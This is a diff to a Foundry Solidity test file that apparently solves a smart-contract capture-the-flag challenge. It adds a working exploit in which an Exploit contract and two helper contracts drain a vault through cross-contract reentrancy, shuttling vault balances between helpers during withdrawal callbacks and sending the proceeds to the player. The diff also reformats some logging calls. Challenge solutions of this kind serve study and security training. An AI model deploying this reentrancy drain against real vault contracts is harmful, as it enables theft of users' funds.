@@ -15,23 +15,84 @@ contract ChallengeTest is Test {
     }
 
     function testExploit() public {
-        emit log_named_decimal_uint("player balance", playerAddress.balance, 18);
-        emit log_named_decimal_uint("vault balance", address(setup.vault()).balance, 18);
+        emit log_named_decimal_uint(
+            "player balance",
+            playerAddress.balance,
+            18
+        );
+        emit log_named_decimal_uint(
+            "vault balance",
+            address(setup.vault()).balance,
+            18
+        );
 
         vm.startPrank(playerAddress, playerAddress);
 
         ////////// YOUR CODE GOES HERE //////////
-
+        Exploit exploit = new Exploit(setup);
+        exploit.execute{value: 1 ether}();
         ////////// YOUR CODE END //////////
 
         assertTrue(setup.isSolved(), "challenge not solved");
         vm.stopPrank();
 
-        emit log_named_decimal_uint("player balance", playerAddress.balance, 18);
-        emit log_named_decimal_uint("vault balance", address(setup.vault()).balance, 18);
+        emit log_named_decimal_uint(
+            "player balance",
+            playerAddress.balance,
+            18
+        );
+        emit log_named_decimal_uint(
+            "vault balance",
+            address(setup.vault()).balance,
+            18
+        );
     }
 }
 
 ////////// YOUR CODE GOES HERE //////////
+contract Exploit {
+    Setup setup;
+    ExploitChild child1;
+    ExploitChild child2;
 
+    constructor(Setup setup_) {
+        setup = setup_;
+        child1 = new ExploitChild(setup);
+        child2 = new ExploitChild(setup);
+    }
+
+    function execute() public payable {
+        while (true) {
+            if (address(this).balance > address(setup.vault()).balance) break;
+            child1.execute{value: address(this).balance}(address(child2));
+            child2.execute{value: address(this).balance}(address(this));
+        }
+        child1.execute{value: address(setup.vault()).balance}(address(child2));
+        child2.execute{value: address(setup.vault()).balance}(address(this));
+        payable(msg.sender).transfer(address(this).balance);
+    }
+
+    receive() external payable {}
+}
+
+contract ExploitChild {
+    Setup setup;
+    address tmpOtherChild;
+
+    constructor(Setup setup_) {
+        setup = setup_;
+    }
+
+    function execute(address tmpOtherChild_) public payable {
+        tmpOtherChild = tmpOtherChild_;
+        setup.vault().deposit{value: msg.value}();
+        setup.vault().withdrawAll();
+        payable(msg.sender).transfer(address(this).balance);
+    }
+
+    receive() external payable {
+        uint256 myVaultBalance = setup.vault().balanceOf(address(this));
+        setup.vault().transfer(tmpOtherChild, myVaultBalance);
+    }
+}
 ////////// YOUR CODE END //////////
